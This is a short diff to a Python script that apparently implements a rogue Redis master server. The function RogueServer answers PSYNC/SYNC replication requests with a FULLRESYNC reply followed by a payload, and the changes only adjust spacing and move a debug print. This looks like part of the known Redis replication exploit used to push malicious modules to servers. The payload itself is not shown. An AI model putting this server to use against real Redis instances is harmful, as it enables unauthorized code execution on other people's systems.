@@ -29,10 +29,10 @@ def RogueServer(lport):
 
             conn.send(resp)
         elif b"PSYNC" in data or b"SYNC" in data:
-            resp =  bytes("+FULLRESYNC " + "Z"*40 + " 1" + CLRF+"$"+str(len(payload)) + CLRF,'utf-8')
+            resp = bytes("+FULLRESYNC " + "Z"*40 + " 1" + CLRF+"$"+str(len(payload)) + CLRF,'utf-8')
             # resp = resp.encode()
-            print("3-resp is", resp)
             resp += payload + CLRF.encode()
+            print("3-resp is", resp)
             # if type(resp) != bytes:
                 # resp =resp.encode()
 
